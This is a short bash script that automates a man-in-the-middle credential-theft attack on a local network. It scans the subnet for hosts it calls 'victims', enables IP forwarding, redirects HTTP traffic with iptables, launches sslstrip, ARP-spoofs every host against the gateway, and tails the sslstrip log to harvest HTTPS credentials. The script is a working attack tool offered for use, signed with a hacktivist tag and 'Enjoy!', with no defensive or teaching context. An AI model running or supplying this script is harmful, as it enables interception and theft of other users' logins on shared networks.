if [ $# -eq 0 -o $# -lt 2 ]
	then
		echo "Usage : <Script> <listening port> <Interface Name>"
		exit 1
	fi

netstat -r | grep default > temp  #get Default gateway 
#Default gateway ip in 10th Field 
echo "Default Gateway : "
GATEWAY=`cut -d" " -f10 temp`
echo $GATEWAY

#rm temp
echo "Start Scanning for Possible Victims ..."
nmap -sP 192.168.1.1/24 | grep 192.168.1 >  temp
cut -d" " -f5 temp > ipHostList
rm temp

echo "List of Victims IP:"
cat ipHostList

echo "enable IPv4 Forwarding from port 80(HTTP) to port $1"
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $1

echo "Redirection Complete ."


echo "Extracting local IP address ..."
# $2 is interface name
ifconfig $2 | grep "inet addr" > ipTemp

cut -d" " -f12 ipTemp > ipTemp2
LOCALIP=`cut -d":" -f2 ipTemp2`

echo "Your IP is :$LOCALIP"

rm ipTemp
rm ipTemp2

echo "Start sslstrip on port $1"
gnome-terminal -e "sslstrip -k -l $1"

echo "Start ArpSpoofing for all possible victim IP's"
# arpSpoof Each IP in the list by Opening new Terminal for Each ip
while read -r line
do
	if [ "$line" != "$GATEWAY"  -a "$line" != "$LOCALIP" ]
		then
    		echo "Start ArpSpoofing for  : $line"
		gnome-terminal -e "./arpSpoofStart.sh $line $GATEWAY"
	fi
    
done < ipHostList


echo "Check log for HTTPS credintials .."
echo "Work on IE , FireFox , Some Chrome Websites !"
gnome-terminal -e "tail -f sslstrip.log"

 

rm ipHostList
echo "Press [CTRL+C] to stop.."
echo "<Done By : Bassam SJ 13-9-2014 Anonymous Palestine > ....Enjoy !"

while :
do
	
	sleep 1
done
